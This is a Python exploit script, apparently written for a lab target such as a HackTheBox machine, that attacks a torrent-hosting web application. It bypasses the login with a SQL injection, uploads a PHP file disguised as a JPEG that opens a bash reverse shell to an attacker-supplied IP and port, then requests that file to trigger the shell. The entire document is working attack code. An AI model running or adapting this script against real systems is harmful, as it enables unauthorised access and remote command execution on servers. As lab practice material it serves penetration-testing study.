#!/usr/bin/python3
# Creator: brutuspt

import requests
import argparse
import os, sys
from bs4 import BeautifulSoup
from requests.utils import requote_uri

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-i", "--IP", help="Attacker IP (Where to catch the rev shell)", required=True)
parser.add_argument("-p", "--port", help="Attacker Port (Where to catch the rev shell)", required=True)

args = parser.parse_args()

s = requests.Session()


def login_bypass(target):
    # Bypass the login function with a SQL Injection
    
    url = "http://%s/torrent/login.php" % target
    
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    data = { "username" : "admin' or '1'='1"  ,"password" : "admin' or '1'='1" }
    #proxies = { "http" : "127.0.0.1:8080" }
    
    #s = requests.Session()
    r = s.post(url, headers=headers, data=data) # proxies=proxies
    #print(r.text)

    if '<a href="http://10.10.10.6/torrent/admin">' in r.text:
        print("[INFO] The SQL Injection was successful, we are now Admin on the page!")
    else:
        print("[ERROR] SQL Injection failed!")
        sys.exit(1)


def get_torrent_id(target):
    # Need to find out the link where to change and upload the rev shell
    url = "http://%s/torrent/index.php?mode=directory" % target
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    
    grab_url = s.get(url, headers=headers)
    soup = BeautifulSoup(grab_url.text, 'html.parser')

    for link in soup.find_all('a'):
        if "Kali Linux" in link:
            #obtained the Kali Linux torrent link ID
            # Example: 723bc28f9b6f924cca68ccdff96b6190566ca6b4
            torrent_id = link.get('href').split("=")[2]
            return torrent_id



def upload_shell(target, torrent_id, ip, port):

    url = "http://%s/torrent/upload_file.php?mode=upload&id=%s" % (target, torrent_id) 
    headers = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
        }
    
    php_rev_shell = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/" + str(ip) + "/" + str(port) + " 0>&1'\");"
    encoded_shell = requote_uri(php_rev_shell)

    files = {
        'file': ('shell.php', php_rev_shell, 'image/jpeg')
    }

    data = { "file" : files['file'], "submit" : "Submit+Screenshot" }
    #proxies = { "http" : "127.0.0.1:8080" }
    
    r = s.post(url, headers=headers, files=files,  data= {'submit' : 'Submit+Screenshot'}) #proxies=proxies
    #print(r.text)

    if "Upload Completed" in r.text:
        print("The reverse shell was uploaded successfully!")
    else:
        print("Upload failed!")


def shell_trigger(target, torrent_id, ip, port):
    # Now that the shell must be uploaded, we need o access it
    url = "http://%s/torrent/upload/%s.php" % (target, torrent_id) 
    headers = { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" }
    
    print("Triggering the reverse shell, check your listener " + str(ip) + ":" + str(port))
    trigger_url = s.get(url, headers=headers)



def main():
    login_bypass(args.target)
    torrent_id = get_torrent_id(args.target)
    upload_shell(args.target, torrent_id, args.IP, args.port)
    shell_trigger(args.target, torrent_id, args.IP, args.port)


if __name__ == "__main__":
    main()
